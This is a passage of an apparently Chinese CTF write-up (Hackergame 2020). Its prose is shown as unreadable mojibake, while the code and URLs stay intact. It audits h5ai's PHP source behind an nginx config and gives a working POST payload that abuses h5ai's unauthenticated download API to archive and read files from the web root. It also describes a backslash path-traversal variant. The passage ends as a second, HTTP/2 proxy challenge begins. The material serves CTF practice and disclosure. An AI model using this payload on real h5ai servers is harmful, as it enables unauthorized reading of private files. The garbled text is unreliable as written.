keyword">auth_basic_user_file</span> <span class="token operator">/</span>etc<span class="token operator">/</span>nginx<span class="token operator">/</span>conf<span class="token punctuation">.</span>d<span class="token operator">/</span>htpasswd<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment"># Public ç›®å½•æ˜¯å…¬å¼€çš„ï¼Œä»»ä½•äººéƒ½å¯ä»¥è®¿é—®ï¼Œä¾¿äºæˆ‘ç»™å¤§å®¶åˆ†äº«æ–‡ä»¶</span>    <span class="token keyword">location</span> <span class="token operator">/</span>Public <span class="token punctuation">{</span>        <span class="token keyword">allow</span> all<span class="token punctuation">;</span>        <span class="token keyword">index</span> <span class="token operator">/</span>Public<span class="token operator">/</span>_h5ai<span class="token operator">/</span>public<span class="token operator">/</span><span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment"># PHP çš„ fastcgi é…ç½®ï¼Œå°†è¯·æ±‚è½¬å‘ç»™ php-fpm</span>    <span class="token keyword">location</span> <span class="token operator">~</span> \<span class="token punctuation">.</span>php$ <span class="token punctuation">{</span>             <span class="token keyword">fastcgi_pass</span>   <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">9000</span><span class="token punctuation">;</span>             <span class="token keyword">fastcgi_index</span>  <span class="token keyword">index</span><span class="token punctuation">.</span>php<span class="token punctuation">;</span>             <span class="token keyword">fastcgi_param</span>  SCRIPT_FILENAME  <span class="token variable">$document_root</span><span class="token variable">$fastcgi_script_name</span><span class="token punctuation">;</span>             <span class="token keyword">include</span>        fastcgi_params<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">location</span> <span class="token operator">~</span> <span class="token operator">/</span>\<span class="token punctuation">.</span> <span class="token punctuation">{</span>        <span class="token keyword">log_not_found</span> off<span class="token punctuation">;</span>        <span class="token keyword">deny</span> all<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>ï¼ˆæä¸€å¥ï¼Œè¿™ä¸ªå¯†é’¥æ–‡ä»¶è¯´ä¸å¥½è¿˜ä¸å­˜åœ¨ï¼ˆx</p><p>ï¼ˆæœ¬åœ°æ­å»ºå°±æ˜¯è¿™æ ·ï¼Œä½†ä¸å½±å“é¢˜ç›®ã€‚</p><p>åˆšå¼€å§‹è¿˜ä»¥ä¸ºæ˜¯ Nginx é…ç½®é—®é¢˜ï¼Œå¯èƒ½è·¯å¾„ç©¿è¶Šï¼Œä¾‹å¦‚ <code>/Public../</code>ï¼Œ<del>ä½†ä¸çŸ¥é“è·‘å“ªå»äº†</del></p><p>æœ¬åœ°æ­å»ºè¯•äº†è¯•ï¼Œçš„ç¡®è·¯ç”±åˆ° <code>/Public../</code> ç›®å½•ä¸‹äº†ï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥åˆ—ä¸å‡ºæ–‡ä»¶ï¼Œæ–‡ä»¶ä¸‹è½½å€’æ˜¯å¯ä»¥çš„ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105012811728.png" alt="å»ºç«‹ç›®å½•å†™å…¥æ–‡ä»¶"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105012726981.png" alt="åˆ—ä¸å‡ºæ–‡ä»¶"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105012907207.png" alt="èƒ½è¯»å–æ–‡ä»¶"></p><p>å¯èƒ½æ˜¯éœ€è¦è®¾ç½® <code>alias</code>ï¼Œå¼€å¯ <code>autoindex</code>ï¼Œæ‰ä¼šæœ‰è¿™ä¸ªæ¼æ´å§ã€‚</p><p>å†æƒ³æƒ³ï¼Œéš¾é“æ˜¯ <a href="https://www.cnblogs.com/wuxinmengyi/p/11746193.html">php-fpmåœ¨nginxç‰¹å®šç¯å¢ƒä¸‹çš„ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2019-11043ï¼‰</a>ï¼Ÿï¼ˆGitHub **<a href="https://github.com/neex/phuip-fpizdam">phuip-fpizdam</a>**ï¼‰</p><p>çœ‹äº†ä¸‹ä¹Ÿä¸æ˜¯ã€‚</p><p>ä¸è¡Œäº†ä¸è¡Œäº†ï¼Œæ„Ÿè§‰ä¸æ˜¯ nginx çš„é—®é¢˜ï¼Œ<strong>å¾—å®¡è®¡æºç äº†</strong>ã€‚</p><p>æ ¹æ® Nginx é…ç½®ï¼Œè®¿é—®è¿™ä¸ª <a href="http://202.38.93.111:10120/Public/_h5ai/public/index.php">http://202.38.93.111:10120/Public/_h5ai/public/index.php</a> ï¼Œå‘ç°å¯†ç ä¸ºç©ºï¼Œæœ‰ä¸€äº›ç›¸å…³çš„ä¿¡æ¯ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105011532703.png" alt="config"></p><p>æŠŠæºç ä¸‹è½½ä¸‹æ¥ï¼Œè¿™ä¸ª<code>index.php</code>è°ƒç”¨äº† <code>class-bootstrap.php</code>ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">require_once</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/../private/php/class-bootstrap.php'</span><span class="token punctuation">;</span><span class="token class-name static-context">Bootstrap</span><span class="token operator">::</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><code>class-bootstrap.php</code> é‡Œåˆ¤æ–­è¯·æ±‚æ¥æºï¼Œåˆ¤æ–­æ˜¯ api/info/elseï¼Ÿ</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">spl_autoload_register</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'Bootstrap'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'autoload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'LANG=en_US.UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setlocale</span><span class="token punctuation">(</span><span class="token constant">LC_CTYPE</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'en_US.UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span>@<span class="token function">date_default_timezone_get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Session</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$request</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$setup</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Setup</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-&gt;</span><span class="token function">query_boolean</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'refresh'</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$context</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Context</span><span class="token punctuation">(</span><span class="token variable">$session</span><span class="token punctuation">,</span> <span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$setup</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$context</span><span class="token operator">-&gt;</span><span class="token function">is_api_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Api</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$context</span><span class="token operator">-&gt;</span><span class="token function">is_info_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$public_href</span> <span class="token operator">=</span> <span class="token variable">$setup</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PUBLIC_HREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$x_head_tags</span> <span class="token operator">=</span> <span class="token variable">$context</span><span class="token operator">-&gt;</span><span class="token function">get_x_head_html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fallback_mode</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/pages/info.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token variable">$public_href</span> <span class="token operator">=</span> <span class="token variable">$setup</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'PUBLIC_HREF'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$x_head_tags</span> <span class="token operator">=</span> <span class="token variable">$context</span><span class="token operator">-&gt;</span><span class="token function">get_x_head_html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fallback_mode</span> <span class="token operator">=</span> <span class="token variable">$context</span><span class="token operator">-&gt;</span><span class="token function">is_fallback_mode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$fallback_html</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Fallback</span><span class="token punctuation">(</span><span class="token variable">$context</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">get_html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/pages/index.php'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><code>class-context.php</code>:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">is_api_request</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">setup</span><span class="token operator">-&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'post'</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>äºæ˜¯åªè¦å‘ä¸ª POST è¯·æ±‚å°±èƒ½è°ƒç”¨ API.</p><p>è¯•è¯•å‘ç°ç¼ºå‚æ•°ã€‚</p><p>çœ‹è°ƒç”¨ï¼š <code>(new Api($context))-&gt;apply();</code></p><p><code>class-api.php</code>:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">apply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">request</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$supported</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'download'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'get'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'login'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'logout'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token function">json_fail</span><span class="token punctuation">(</span><span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token constant">ERR_UNSUPPORTED</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'unsupported action'</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token punctuation">,</span> <span class="token variable">$supported</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$methodname</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'on_'</span> <span class="token operator">.</span> <span class="token variable">$action</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token variable">$methodname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">on_download</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token function">json_fail</span><span class="token punctuation">(</span><span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token constant">ERR_DISABLED</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'download disabled'</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">context</span><span class="token operator">-&gt;</span><span class="token function">query_option</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'download.enabled'</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$as</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">request</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'as'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">request</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$base_href</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">request</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'baseHref'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$hrefs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">request</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hrefs'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$archive</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Archive</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">context</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Type: application/octet-stream'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Content-Disposition: attachment; filename="'</span> <span class="token operator">.</span> <span class="token variable">$as</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'"'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Connection: close'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$ok</span> <span class="token operator">=</span> <span class="token variable">$archive</span><span class="token operator">-&gt;</span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$base_href</span><span class="token punctuation">,</span> <span class="token variable">$hrefs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token function">json_fail</span><span class="token punctuation">(</span><span class="token class-name static-context">Util</span><span class="token operator">::</span><span class="token constant">ERR_FAILED</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'packaging failed'</span><span class="token punctuation">,</span> <span class="token operator">!</span><span class="token variable">$ok</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>æˆ‘è¿™é‡Œç”¨äº† <code>download</code> æ–¹æ³•ï¼ŒæŒ‰ç…§ä»£ç ä¾æ¬¡è¡¥ä¸Šå‚æ•°å°±å®Œäº‹äº†ã€‚</p><p><code>class-archive.php</code>:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token variable">$base_href</span><span class="token punctuation">,</span> <span class="token variable">$hrefs</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">base_path</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">context</span><span class="token operator">-&gt;</span><span class="token function">to_path</span><span class="token punctuation">(</span><span class="token variable">$base_href</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">context</span><span class="token operator">-&gt;</span><span class="token function">is_managed_path</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">base_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dirs</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">add_hrefs</span><span class="token punctuation">(</span><span class="token variable">$hrefs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dirs</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">files</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'php-tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">add_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">base_path</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">add_dir</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">base_path</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'php-tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">php_tar</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">dirs</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">files</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'shell-tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">shell_cmd</span><span class="token punctuation">(</span><span class="token class-name static-context">Archive</span><span class="token operator">::</span><span class="token variable">$TAR_PASSTHRU_CMD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'shell-zip'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">shell_cmd</span><span class="token punctuation">(</span><span class="token class-name static-context">Archive</span><span class="token operator">::</span><span class="token variable">$ZIP_PASSTHRU_CMD</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>è¿™é‡Œå°±ç”¨ <code>shell-zip</code> å¥½äº†ï¼Œå…¶å®éƒ½è¡Œã€‚</p><p>äºæ˜¯è¿™é¢˜å…¶å®å°±æ˜¯ <strong>h5ai è‡ªå¸¦çš„ API é€ æˆçš„æ–‡ä»¶è¯»å–</strong>ï¼Œä¸»è¦è¿™ä¸ªæ¥å£æ²¡æœ‰é‰´æƒï¼Œæ›´ä¸»è¦çš„æ˜¯ Dockerfile é‡Œç”¨çš„æ˜¯ cp å¤åˆ¶è€Œä¸æ˜¯ mv ç§»åŠ¨ã€‚</p><p>å™¢å¯¹äº†ï¼Œè¦ç”¨æ ¹ç›®å½•çš„é‚£ä¸ª <code>_h5ai</code>.</p><p>ï¼ˆå‘ç°æ ¹ç›®å½•è®¿é—® <code>.php</code> ä¼šç›´æ¥ä¸¢ç»™ fastcgi å¤„ç†äº†ï¼Œä¹Ÿå°±ç»•è¿‡äº† Basic Authã€‚</p><p><strong>Payload:</strong>  POST</p><pre class="language-none"><code class="language-none">http://202.38.93.111:10120/_h5ai/public/index.php?action=download&amp;as=flag&amp;type=shell-zip&amp;baseHref=/</code></pre><p>ï¼ˆ<code>hrefs</code> å‚æ•°å‘ç°ä¸éœ€è¦ä¹Ÿè¡Œã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201105011630778.png" alt="FLAG"></p><p>ä¿å­˜å“åº”ï¼Œç„¶åè§£å‹å°±å¾—åˆ° flag.txt äº†ã€‚</p><p><code>flag{super_secure_cloud}</code></p><blockquote><p>BTW, æœ‰å¤§ä½¬å‘ç°è¿™é‡Œçš„<code>hrefs</code> å‚æ•°æ²¡æœ‰æ£€æŸ¥ <code>\\..</code>, <code>..\\</code> ç­‰ï¼Œå¯ä»¥æ„é€ è·¯å¾„ <code>/Public\\..\\flag.txt</code>ï¼Œæ­¤æ—¶ç»è¿‡ normalize å <code>/Public/../</code>ï¼Œä»è€Œè·¯å¾„ç©¿è¶Šå®ç°ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p><p>è¯¦è§ <a href="https://github.com/USTC-Hackergame/hackergame2020-writeups/blob/54ddd50dad28aa1fe898edbccb1d266a31798879/players/cytvictor/writeup.md">cytvictor å¸ˆå‚…çš„ WriteUp</a></p><p><a href="https://github.com/lrsjng/h5ai/issues/758">h5ai#758: A potential security issue of unauthorized access</a></p><p>ä»¥åŠ <a href="https://github.com/lrsjng/h5ai/issues/760">h5ai#760: Unchecked l10n input leads to arbitrary JSON file reads</a></p><p>ï¼ˆç®—æ˜¯ 0day æ¼æ´äº†å§</p></blockquote><hr><h2 id="è¶…å®‰å…¨çš„ä»£ç†æœåŠ¡å™¨"><a href="#è¶…å®‰å…¨çš„ä»£ç†æœåŠ¡å™¨" class="headerlink" title="è¶…å®‰å…¨çš„ä»£ç†æœåŠ¡å™¨"></a>è¶…å®‰å…¨çš„ä»£ç†æœåŠ¡å™¨</h2><p><em>ï¼ˆå¤ç°ï¼‰</em></p><blockquote><p>åœ¨ 2039 å¹´ï¼Œçˆ†å‘äº†ä¸€åœºå²æ— å‰ä¾‹çš„ç–«æƒ…ã€‚ä¸ºäº†ä¾¿äºåœ¨å„åœ°çš„åŒå­¦è®¿é—®æŸçŸ¥åå¤§å­¦ã€Œè£¤å­å¤§ã€çš„ç½‘ç«™è¿›è¡Œã€Œæ¯æ—¥å¥åº·æ‰“å¡ã€ï¼Œå° C åŒå­¦ä¸ºå¤§å®¶æä¾›äº†è¿™æ ·ä¸€ä¸ªä»£ç†æœåŠ¡ã€‚æ›¾ç»ä¿¡æ¯å®‰å…¨ä¸“ä¸šå‡ºèº«çš„å° C å†³å®šæŠŠè¿™ä¸ªä»£ç†è®¾è®¡æˆæœ€å®‰å…¨çš„ä»£ç†ã€‚</p><p><strong>æç¤ºï¼šæµè§ˆå™¨å¯èƒ½ä¼šæç¤ºè¯¥ TLS è¯ä¹¦æ— æ•ˆï¼Œä¸æœ¬é¢˜è§£æ³•æ— å…³ï¼Œä¿¡ä»»å³å¯ã€‚</strong></p><p><strong>å…¬å‘Šï¼šé¢˜ç›®å¸®åŠ©é¡µé¢ï¼ˆ<a href="https://146.56.228.227/help%EF%BC%89%E5%8F%B3%E4%B8%8B%E8%A7%92%E7%9A%84%E3%80%8C%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83%E3%80%8D%E9%93%BE%E6%8E%A5%E6%9C%89%E8%AF%AF%EF%BC%8C%E5%BA%94%E8%AF%A5%E4%B8%8E%E9%A6%96%E9%A1%B5%E7%9B%B8%E5%90%8C%EF%BC%8C%E9%83%BD%E6%98%AF%E6%8C%87%E5%90%91">https://146.56.228.227/helpï¼‰å³ä¸‹è§’çš„ã€Œç®¡ç†ä¸­å¿ƒã€é“¾æ¥æœ‰è¯¯ï¼Œåº”è¯¥ä¸é¦–é¡µç›¸åŒï¼Œéƒ½æ˜¯æŒ‡å‘</a> <a href="http://127.0.0.1:8080/">http://127.0.0.1:8080/</a></strong></p></blockquote><h3 id="æ‰¾åˆ°-Secret"><a href="#æ‰¾åˆ°-Secret" class="headerlink" title="æ‰¾åˆ° Secret"></a>æ‰¾åˆ° Secret</h3><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107205709657.png" alt="ä¸»é¡µ"></p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107205810635.png" alt="help"></p><p>è¿™é¢˜ç”¨äº† HTTP2 çš„ Server PUSHã€‚</p><p>å…·ä½“å¯ä»¥å‚è€ƒä¸€ä¸‹ <a href="https://en.wikipedia.org/wiki/HTTP/2_Server_Push">Wikipedia: HTTP/2 Server Push</a> ä»¥åŠ <a href="http://www.ruanyifeng.com/blog/2018/03/http2_server_push.html">é˜®ä¸€å³°çš„HTTP/2 æœåŠ¡å™¨æ¨é€ï¼ˆServer Pushï¼‰æ•™ç¨‹</a>ã€‚</p><p>é€šå¸¸ç”¨åˆ° Server Push çš„è¯éƒ½æ˜¯æŠŠ CSSã€JS ä¹‹ç±»çš„èµ„æºé¡ºä¾¿æ¨é€ç»™ç”¨æˆ·ï¼Œç„¶è€Œè¿™ä¸€é¢˜æ¢äº†å‡ ä¸ªæµè§ˆå™¨éƒ½æ²¡è§åˆ°æ¨é€äº†å•¥èµ„æºâ€¦â€¦</p><p>ç”šè‡³ç”¨ Postmanï¼ˆè²Œä¼¼ä¸æ”¯æŒ HTTP2?ï¼‰ / Burp Suiteï¼ˆæ‰‹åŠ¨æ”¹è¯·æ±‚å¤´ï¼‰é™çº§åˆ° HTTP/1.0 æˆ–è€… HTTP/1.1ï¼Œå°±ä¸è®©ä½ ç”¨ã€‚</p><p><img src="/2020/11/08/CTF_2020Hackergame/image-20201107210459289.png" 